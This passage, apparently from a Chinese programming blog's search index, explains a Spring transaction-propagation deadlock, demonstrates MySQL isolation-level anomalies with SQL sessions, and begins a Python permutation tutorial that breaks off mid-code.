class=\"line\">    <span class=\"type\">DecimalFormat</span> <span class=\"variable\">format</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DecimalFormat</span>(<span class=\"string\">&quot;0000000&quot;</span>);</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">serialNum</span> <span class=\"operator\">=</span> serialNumber.getScope() + format.format(serialNumberService.mysqlSerialNumber(serialNumber, <span class=\"number\">1</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//生成插入数据</span></span><br><span class=\"line\">    <span class=\"type\">Item</span> <span class=\"variable\">item</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Item</span>(skuCode, num, <span class=\"number\">0</span>);</span><br><span class=\"line\">    item.setSerialNum(serialNum);</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> itemMapper.insertNotExist2(item);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (result == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"type\">Item</span> <span class=\"variable\">newItem</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Item</span>(skuCode, <span class=\"literal\">null</span>, <span class=\"number\">4</span>);</span><br><span class=\"line\">        <span class=\"type\">Item</span> <span class=\"variable\">oldItem</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Item</span>(skuCode, <span class=\"literal\">null</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">        result = itemMapper.updateInfo(oldItem, newItem);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (result != <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            result = itemMapper.insertNotExist2(item);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如上，先生成流水号，然后对业务数据进行插入。<br>创建单元测试如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Test</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">createItem</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">threadNum</span> <span class=\"operator\">=</span> <span class=\"number\">20</span>;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">skuCode</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;K000001&quot;</span>;</span><br><span class=\"line\">    Thread[]threads = <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>[threadNum];</span><br><span class=\"line\">    <span class=\"type\">CountDownLatch</span> <span class=\"variable\">downLatch</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">CountDownLatch</span>(threadNum);</span><br><span class=\"line\">    IntStream.range(<span class=\"number\">0</span>, threadNum).forEach((i) -&gt; threads[i] = <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(() -&gt;&#123;</span><br><span class=\"line\">        itemService.createItem(skuCode, <span class=\"number\">3</span>);</span><br><span class=\"line\">        downLatch.countDown();</span><br><span class=\"line\">    &#125;));</span><br><span class=\"line\">    Arrays.stream(threads).forEach(Thread::start);</span><br><span class=\"line\">    downLatch.await();</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>启动20个线程，对数据库数据进行操作。</p>\n<p>此处结果是一直等待，直到sql等待超时。</p>\n<p>分析原因如下：<br>在之前使用数据库理解池使用的是最大20个数据库连接，因为启动了20个线程，消耗了掉了连接池中的连接，当执行到生成流水号时，因为之前流水号设置的事务传播级别是<code>Propagation.REQUIRES_NEW</code>，所以会向连接池申请新的连接，但是因为连接池中连接已经消耗完毕，只能等待连接释放，但此时连接池又全部被占用，这样互相等待导致超时发生。</p>\n<p>Spring事务传播级别：<br>方法a有事务，方法b有事务</p>\n<ul>\n<li>REQUIRED（默认）：支持当前已经存在的事务，如果还没有事务，就创建一个新事务。</li>\n<li>SUPPORTS：支持当前事务，如果没有事务那么就不在事务中运行。</li>\n<li>MANDATORY：支持当前已经存在的事务，如果还没有事务，就抛出一个异常。</li>\n<li>REQUIRES_NEW：挂起当前事务，创建一个新事务，如果还没有事务，就简单地创建一个新事务，和之前创建的事务无关。</li>\n<li>NOT_SUPPORTED：强制不在事务中运行，如果当前存在一个事务，则挂起该事务。</li>\n<li>NEVER：强制要求不在事务中运行，如果当前存在一个事务，则抛出异常。</li>\n<li>NESTED：在当前事务中创建一个嵌套事务，如果还没有事务，那么就简单地创建一个新事务。和REQUIRES_NEW区别是在于，该处创建的事务和之前事务是嵌套关系，在嵌套事务提交后，如果调用方抛出异常，子事务还是会回滚。</li>\n</ul>\n<p>参考：<span class=\"exturl\" data-url=\"aHR0cDovL2RlbHRhbWFzdGVyLmlzLXByb2dyYW1tZXIuY29tL3Bvc3RzLzI4NDg5Lmh0bWw=\">Spring事务管理中@Transactional的propagation参数<i class=\"fa fa-external-link-alt\"></i></span></p>\n<h4 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h4><p>修改事务传播级别为默认，这样导致的缺陷是流水号生成的事务较长，这样流水号生成速度会比较慢。采用redis生成流水号。</p>\n","categories":["工作问题","事务"],"tags":["工作","事务","并发"]},{"title":"Java进阶-mysql事务","url":"/2018/04/04/Java%E8%BF%9B%E9%98%B6-mysql%E4%BA%8B%E5%8A%A1/","content":"<p>在使用数据库时，因为存在不同的用户操作同一条数据，数据库可能出现如下问题：</p>\n<ul>\n<li>脏读：表示一个事务正在访问数据，并且对数据进行了修改，而这种修改还么提交到数据库，这个时候，另一个事务也访问了这个数据，然后获取到了该事务未提交的数据。</li>\n<li>不可重复读：是指在一个事务内，多次读取同一数据。在这个事务还没结束时，另一个事务也访问并修改了改数据（已经提交事务），第一个事务再次读取数据发现两次读取的数据不一样。</li>\n<li>幻读：一个事务计划对表中数据进行修改，同时第二个事务向表中插入了一条数据（提交事务），符合第一个事务中的条件，之后第一个事务对表进行修改，那么对于操作第一个事务的用户而言，会发现表中还有其他数据（第二个事务），如同幻觉。<span id=\"more\"></span></li>\n</ul>\n<h3 id=\"事务导致的问题\"><a href=\"#事务导致的问题\" class=\"headerlink\" title=\"事务导致的问题\"></a>事务导致的问题</h3><h4 id=\"脏读\"><a href=\"#脏读\" class=\"headerlink\" title=\"脏读\"></a>脏读</h4><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">-- 开启第一个连接</span></span><br><span class=\"line\"><span class=\"comment\">-- 先设置数据库事务未最低级别</span></span><br><span class=\"line\">mysql1<span class=\"operator\">&gt;</span> <span class=\"keyword\">set</span> SESSION  transaction ISOLATION LEVEL READ UNCOMMITTED;</span><br><span class=\"line\"><span class=\"comment\">-- 设置事务不自动提交</span></span><br><span class=\"line\">mysql1<span class=\"operator\">&gt;</span> <span class=\"keyword\">set</span> autocommit <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">mysql1<span class=\"operator\">&gt;</span> <span class=\"keyword\">start</span> transaction;</span><br><span class=\"line\">mysql1<span class=\"operator\">&gt;</span> <span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> item <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> id <span class=\"keyword\">desc</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span> id <span class=\"operator\">|</span> serial_num <span class=\"operator\">|</span> sku_code <span class=\"operator\">|</span> num <span class=\"operator\">|</span> status <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span>  <span class=\"number\">1</span> <span class=\"operator\">|</span> <span class=\"number\">000001</span>     <span class=\"operator\">|</span> K00006   <span class=\"operator\">|</span>   <span class=\"number\">5</span> <span class=\"operator\">|</span>      <span class=\"number\">1</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 开启第二个连接</span></span><br><span class=\"line\"><span class=\"comment\">-- 设置事务不自动提交</span></span><br><span class=\"line\">mysql2<span class=\"operator\">&gt;</span> <span class=\"keyword\">set</span> autocommit <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"comment\">-- 开启事务不提交事务</span></span><br><span class=\"line\">mysql2<span class=\"operator\">&gt;</span> <span class=\"keyword\">start</span> transaction;</span><br><span class=\"line\">mysql2<span class=\"operator\">&gt;</span> <span class=\"keyword\">update</span> item <span class=\"keyword\">set</span> status <span class=\"operator\">=</span> <span class=\"number\">2</span> <span class=\"keyword\">where</span> i <span class=\"operator\">=</span> <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 切换到第一个事务查询数据</span></span><br><span class=\"line\">mysql1<span class=\"operator\">&gt;</span> <span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> item;</span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span> id <span class=\"operator\">|</span> serial_num <span class=\"operator\">|</span> sku_code <span class=\"operator\">|</span> num <span class=\"operator\">|</span> status <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span>  <span class=\"number\">1</span> <span class=\"operator\">|</span> <span class=\"number\">000001</span>     <span class=\"operator\">|</span> K00006   <span class=\"operator\">|</span>   <span class=\"number\">5</span> <span class=\"operator\">|</span>      <span class=\"number\">2</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 查询到了第二个事务未提交的数据</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 切换到第二个事务回滚</span></span><br><span class=\"line\">mysql2<span class=\"operator\">&gt;</span> <span class=\"keyword\">rollback</span>;</span><br></pre></td></tr></table></figure>\n<p>如上操作，事务1读取到了事务2未提交的数据。在有些情况下<code>脏读</code>比较危险，如：A转账给B，A转账后，还有后续逻辑，都在一个事务里面，这时B去查账，查询到了余额的增加，如果B中某个耗时逻辑发送了错误导致事务回滚，这样实际是没有成功，对于B而言之前是已经看见成功了。</p>\n<p>在使用自增ID时，此时自增ID为1，如果一个事务提交了insert，生成的自增加ID为2，另外一个事务也提交了insert，生成的自增ID为3，因为第一个事务并未提交，第二个事务却生成的自增ID为3。这勉强可以视为脏的读，只不过这种情况是为了在并发时提升数据库性能做的操作。</p>\n<h4 id=\"不可重复读\"><a href=\"#不可重复读\" class=\"headerlink\" title=\"不可重复读\"></a>不可重复读</h4><p>不可重复读和脏读的区别在于，在事务内，一个是读取到了另一个事务未提交的数据；一个是读取了另一个已经提交的数据，前后读取的数据不一致。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">mysql1<span class=\"operator\">&gt;</span> <span class=\"keyword\">set</span> SESSION  transaction ISOLATION LEVEL READ COMMITTED;</span><br><span class=\"line\">mysql1<span class=\"operator\">&gt;</span> <span class=\"keyword\">commit</span>;</span><br><span class=\"line\">mysql1<span class=\"operator\">&gt;</span> <span class=\"keyword\">start</span> transaction;</span><br><span class=\"line\">mysql1<span class=\"operator\">&gt;</span> <span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> item <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> id <span class=\"keyword\">desc</span>;</span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span> id <span class=\"operator\">|</span> serial_num <span class=\"operator\">|</span> sku_code <span class=\"operator\">|</span> num <span class=\"operator\">|</span> status <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span>  <span class=\"number\">1</span> <span class=\"operator\">|</span> <span class=\"number\">000001</span>     <span class=\"operator\">|</span> K00006   <span class=\"operator\">|</span>   <span class=\"number\">5</span> <span class=\"operator\">|</span>      <span class=\"number\">1</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 切换事务二，修改数据</span></span><br><span class=\"line\">mysql2<span class=\"operator\">&gt;</span> <span class=\"keyword\">set</span> SESSION  transaction ISOLATION LEVEL READ COMMITTED;</span><br><span class=\"line\">mysql2<span class=\"operator\">&gt;</span> <span class=\"keyword\">commit</span>;</span><br><span class=\"line\">mysql2<span class=\"operator\">&gt;</span> <span class=\"keyword\">start</span> transaction;</span><br><span class=\"line\">mysql2<span class=\"operator\">&gt;</span> <span class=\"keyword\">update</span> item <span class=\"keyword\">set</span> status <span class=\"operator\">=</span> <span class=\"number\">2</span> <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 切换事务一，查询数据。</span></span><br><span class=\"line\">mysql1<span class=\"operator\">&gt;</span> <span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> item <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> id <span class=\"keyword\">desc</span>;</span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span> id <span class=\"operator\">|</span> serial_num <span class=\"operator\">|</span> sku_code <span class=\"operator\">|</span> num <span class=\"operator\">|</span> status <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span>  <span class=\"number\">1</span> <span class=\"operator\">|</span> <span class=\"number\">000001</span>     <span class=\"operator\">|</span> K00006   <span class=\"operator\">|</span>   <span class=\"number\">5</span> <span class=\"operator\">|</span>      <span class=\"number\">1</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\"><span class=\"comment\">-- 事务查询正常，没查到未提交数据</span></span><br><span class=\"line\"><span class=\"comment\">-- 切换事务二，提交事务</span></span><br><span class=\"line\">mysql2<span class=\"operator\">&gt;</span> <span class=\"keyword\">commit</span>;</span><br><span class=\"line\"><span class=\"comment\">-- 切换事务一，查询数据。</span></span><br><span class=\"line\">mysql1<span class=\"operator\">&gt;</span> <span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> item <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> id <span class=\"keyword\">desc</span>;</span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span> id <span class=\"operator\">|</span> serial_num <span class=\"operator\">|</span> sku_code <span class=\"operator\">|</span> num <span class=\"operator\">|</span> status <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span>  <span class=\"number\">1</span> <span class=\"operator\">|</span> <span class=\"number\">000001</span>     <span class=\"operator\">|</span> K00006   <span class=\"operator\">|</span>   <span class=\"number\">5</span> <span class=\"operator\">|</span>      <span class=\"number\">2</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\">mysql1<span class=\"operator\">&gt;</span> <span class=\"keyword\">commit</span>;</span><br></pre></td></tr></table></figure>\n<p>如上操作，事务一在自己事务内读取到的数据前后不一致。</p>\n<h4 id=\"幻读\"><a href=\"#幻读\" class=\"headerlink\" title=\"幻读\"></a>幻读</h4><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">-- 事务一，修改数据</span></span><br><span class=\"line\">mysql1<span class=\"operator\">&gt;</span> <span class=\"keyword\">set</span> SESSION  transaction ISOLATION LEVEL REPEATABLE READ ;</span><br><span class=\"line\">mysql1<span class=\"operator\">&gt;</span> <span class=\"keyword\">commit</span>;</span><br><span class=\"line\">mysql1<span class=\"operator\">&gt;</span> <span class=\"keyword\">start</span> transaction;</span><br><span class=\"line\">mysql1<span class=\"operator\">&gt;</span> <span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> item <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> id <span class=\"keyword\">desc</span>;</span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span> id <span class=\"operator\">|</span> serial_num <span class=\"operator\">|</span> sku_code <span class=\"operator\">|</span> num <span class=\"operator\">|</span> status <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span>  <span class=\"number\">1</span> <span class=\"operator\">|</span> <span class=\"number\">000001</span>     <span class=\"operator\">|</span> K00006   <span class=\"operator\">|</span>   <span class=\"number\">5</span> <span class=\"operator\">|</span>      <span class=\"number\">2</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\"><span class=\"comment\">-- 事务二插入操作</span></span><br><span class=\"line\">mysql2<span class=\"operator\">&gt;</span> <span class=\"keyword\">set</span> SESSION  transaction ISOLATION LEVEL REPEATABLE READ ;</span><br><span class=\"line\">mysql2<span class=\"operator\">&gt;</span> <span class=\"keyword\">commit</span>;</span><br><span class=\"line\">mysql2<span class=\"operator\">&gt;</span> <span class=\"keyword\">start</span> transaction;</span><br><span class=\"line\">mysql2<span class=\"operator\">&gt;</span> <span class=\"keyword\">insert into</span> item(serial_num, sku_code, num, status) <span class=\"keyword\">VALUES</span> (<span class=\"string\">&#x27;000002&#x27;</span>, <span class=\"string\">&#x27;K00006&#x27;</span>, <span class=\"number\">5</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">mysql2<span class=\"operator\">&gt;</span> <span class=\"keyword\">commit</span>;</span><br><span class=\"line\"><span class=\"comment\">-- 事务2修改数据后，事务一查看数据</span></span><br><span class=\"line\">mysql1<span class=\"operator\">&gt;</span> <span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> item <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> id <span class=\"keyword\">desc</span>;</span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span> id <span class=\"operator\">|</span> serial_num <span class=\"operator\">|</span> sku_code <span class=\"operator\">|</span> num <span class=\"operator\">|</span> status <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span>  <span class=\"number\">1</span> <span class=\"operator\">|</span> <span class=\"number\">000001</span>     <span class=\"operator\">|</span> K00006   <span class=\"operator\">|</span>   <span class=\"number\">5</span> <span class=\"operator\">|</span>      <span class=\"number\">2</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\"><span class=\"comment\">-- 此时并未查询到事务二已经提交的事务，此时修改数据库数据</span></span><br><span class=\"line\">mysql1<span class=\"operator\">&gt;</span> <span class=\"keyword\">update</span> item <span class=\"keyword\">set</span> status<span class=\"operator\">=</span><span class=\"number\">4</span> <span class=\"keyword\">where</span> sku_code <span class=\"operator\">=</span> <span class=\"string\">&#x27;K00006&#x27;</span>;</span><br><span class=\"line\">mysql1<span class=\"operator\">&gt;</span> <span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> item <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> id <span class=\"keyword\">desc</span>;</span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span> id <span class=\"operator\">|</span> serial_num <span class=\"operator\">|</span> sku_code <span class=\"operator\">|</span> num <span class=\"operator\">|</span> status <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span>  <span class=\"number\">2</span> <span class=\"operator\">|</span> <span class=\"number\">000002</span>     <span class=\"operator\">|</span> K00006   <span class=\"operator\">|</span>   <span class=\"number\">5</span> <span class=\"operator\">|</span>      <span class=\"number\">4</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span>  <span class=\"number\">1</span> <span class=\"operator\">|</span> <span class=\"number\">000001</span>     <span class=\"operator\">|</span> K00006   <span class=\"operator\">|</span>   <span class=\"number\">5</span> <span class=\"operator\">|</span>      <span class=\"number\">4</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">----+------------+----------+-----+--------+</span></span><br><span class=\"line\"><span class=\"comment\">-- 在事务一内原本只有一条数据的，结果更新后更新了2条数据，而且在查询时，把事务二的数据查询出来了</span></span><br><span class=\"line\">mysql1<span class=\"operator\">&gt;</span> <span class=\"keyword\">commit</span>;</span><br></pre></td></tr></table></figure>\n<p>在原本事务一中只有一条数据，在事务二插入提交后，事务一中对数据进行更新，此时事务二中提交的数据被修改查询出来。</p>\n<h3 id=\"事务隔离级别\"><a href=\"#事务隔离级别\" class=\"headerlink\" title=\"事务隔离级别\"></a>事务隔离级别</h3><p>在上述例子中，每个例子都是使用的不同的事务隔离级别。</p>\n<p>设置事务隔离级别命令<br><code>SET [SESSION | GLOBAL] TRANSACTION ISOLATION LEVEL &#123;READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE&#125;</code></p>\n<p>不同的事务隔离级别用于解决不同的问题：</p>\n<table>\n<thead>\n<tr>\n<th>—</th>\n<th align=\"left\">脏读</th>\n<th align=\"left\">不可重复读</th>\n<th align=\"left\">幻读</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>READ UNCOMMITTED</td>\n<td align=\"left\">可能</td>\n<td align=\"left\">可能</td>\n<td align=\"left\">可能</td>\n</tr>\n<tr>\n<td>READ COMMITTED</td>\n<td align=\"left\">不可能</td>\n<td align=\"left\">可能</td>\n<td align=\"left\">可能</td>\n</tr>\n<tr>\n<td>REPEATABLE READ（mysql InnoDB 默认）</td>\n<td align=\"left\">不可能</td>\n<td align=\"left\">不可能</td>\n<td align=\"left\">可能</td>\n</tr>\n<tr>\n<td>SERIALIZABLE</td>\n<td align=\"left\">不可能</td>\n<td align=\"left\">不可能</td>\n<td align=\"left\">不可能</td>\n</tr>\n</tbody></table>\n<p>对于<code>SERIALIZABLE</code>并没有举例，在使用<code>SERIALIZABLE</code>实际上是自己锁住了数据，其他数据需要修改只能等待锁释放。</p>\n<p>参考：<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jbmJsb2dzLmNvbS96aG91amlueWkvcC8zNDM3NDc1Lmh0bWw=\">MySQL 四种事务隔离级的说明<i class=\"fa fa-external-link-alt\"></i></span></p>\n","categories":["Java进阶","mysql"],"tags":["事务","mysql"]},{"title":"算法-全排列","url":"/2018/04/10/%E7%AE%97%E6%B3%95-%E5%85%A8%E6%8E%92%E5%88%97/","content":"<p>全排列：从包含n个不同元素的数组中，取m个数组，按照一定顺序排列不重复，当m&#x3D;n时为全排列</p>\n<p>如：现在数组[1, 2, 3]的全排列，[1,2,3]、[1,3,2]、[2,1,3]、[2,3,1]、[3,1,2]、[3,2,1]</p>\n<p>实际数量有n!种可能。</p>\n<h3 id=\"递归\"><a href=\"#递归\" class=\"headerlink\" title=\"递归\"></a>递归</h3><p>对于数组[1, 2, 3] 从0开始分别交换值得到数组：[2, 1, 3]、[3, 2, 1]，得到的3个数组（包含原数组）从1开始向后进行交换：[1, 2, 3] –&gt; [1, 3, 2]、[2, 1, 3] –&gt; [2, 3, 1]、[3, 2, 1] –&gt; [3, 1, 2]</p>\n<span id=\"more\"></span>\n<p>图形如下：<br><img src=\"/images/old/20180411%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72018-04-10%E4%B8%8B%E5%8D%8812.06.10.png\"></p>\n<p>每次都是从上一个获取到的数组进行向后替换，可以提供递归完成，代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Solution</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">permute</span>(<span class=\"params\">self, nums</span>):</span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">        :type nums: List[int]</span></span><br><span class=\"line\"><span class=\"string\">        :rtype: List[List[int]]</span></span><br><span class=\"line\"><span class=\"string\">        &quot;&quot;&quot;</span></span><br><span class=\"line\">        result_list = []</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.array(nums, result_list, <span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> result_list</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">array</span>(<span class=\"params\">self, nums, result_list, start</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 递归到末尾结束</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> start == <span class=\"built_in\">len</span>(nums):</span><br><span class=\"line\">            <span class=\"keyword\">return</span></span><br><span class=\"line\">        <span class=\"comment\"># 遍历从指定index向后遍历</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(start, <span class=\"built_in\">len</span>(nums)):</span><br><span class=\"line\">            swap_index = i</span><br><span class=\"line\">            <span class=\"comment\"># 交换数据</span></span><br><span class=\"line\">            nums[start], nums[swap_index] = nums[swap_index], nums[start]</span><br><span class=\"line\">            <span class=\"comment\"># 为了避免重复添加</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> start != <span class=\"number\">0</span> <span class=\"keyword\">and</span> i == start:</span><br><span class=\"line\">                <span class=\"keyword\">pass</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"comment\"># 添加数据进集合</span></span><br><span class=\"line\">                result_list.append(nums.copy())</span><br><span class=\"line\">            <span class=\"comment\"># 获取到的数组继续向后递归，起始从当前+1开始</span></span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.array(nums, result_list, start + <span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 还原修改后的数组，用于下次遍历</span></span><br><span class=\"line\">            nums[swap_index], nums[start] = nums[start], nums[swap_index]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(Solution().permute([<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>]))</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"字典排序\"><a href=\"#字典排序\" class=\"headerlink\" title=\"字典排序\"></a>字典排序</h3><h3 id=\"itertools库中permutations\"><a href=\"#itertools库中permutations\" class=\"headerlink\" title=\"itertools库中permutations\"></a>itertools库中permutations</h3><p>置换循环?<br>还要一种全排序，由python itertools库中permutations，简化版如下：</p>\n<figure class=\"highlight py\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Solution</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">permute</span>(<span class=\"params\">self, nums</span>):</span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">        :type nums: List[int]</span></span><br><span class=\"line\"><span class=\"string\">        :rtype: List[List[int]]</span></span><br><span class=\"line\"><span class=\"string\">        &quot;&quot;&quot;</span></span><br><span class=\"line\">        <span class=\"comment\"># 通过原有nums生成len(num)~1倒排序</span></span><br><span class=\"line\">        cycles = <span class=\"built_in\">list</span>(<span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(nums), <span class=\"number\">0</span>, -<span class=\"number\">1</span>))</span><br><span class=\"line\">        result_nums = [nums.copy()]</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">reversed</span>(<span class=\"built_in\">range</span>(<span 